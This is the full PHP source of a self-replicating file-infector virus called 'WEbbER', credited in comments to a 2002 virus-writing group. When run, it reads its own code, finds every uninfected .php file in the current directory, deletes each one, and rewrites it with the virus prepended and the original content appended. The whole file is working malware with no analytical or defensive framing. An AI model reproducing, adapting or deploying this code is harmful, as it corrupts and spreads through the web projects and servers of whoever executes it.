<?php
function webb()
{
//[WEbbER] by MI_pirat
//Copyright (C) 2002 [Red-Cell] inc.
$c = "";
//Get the virus from the host file
$f = fopen (__FILE__, "r");
$c = fread ($f, filesize (__FILE__));
fclose ($f);
$c = substr($c,0,866);
//Search for files to infect
$handle=opendir('.');
while (($file = readdir($handle))!==false) {
if ($file != "." && $file != "..") 
 {
$s = substr($file, -3);
//If not infected yet, infect it!
if ($s=="php") 
   {
	$g = fopen ($file, "r"); 
	$cont = fread ($g,filesize ($file));      
	fclose ($g);
	if (!strstr($cont,"[WEbbER]")) //check the signature
	{
	unlink("$file"); //delete and prepend the virus
	$g = fopen ($file, "a+"); 
	fwrite ($g,"$c");      	
	fwrite ($g,"\n");
	fwrite ($g,substr($cont,5)); //append the original file
	fclose ($g);
	}
   }

 }

}

closedir($handle); 
}
webb();
?>
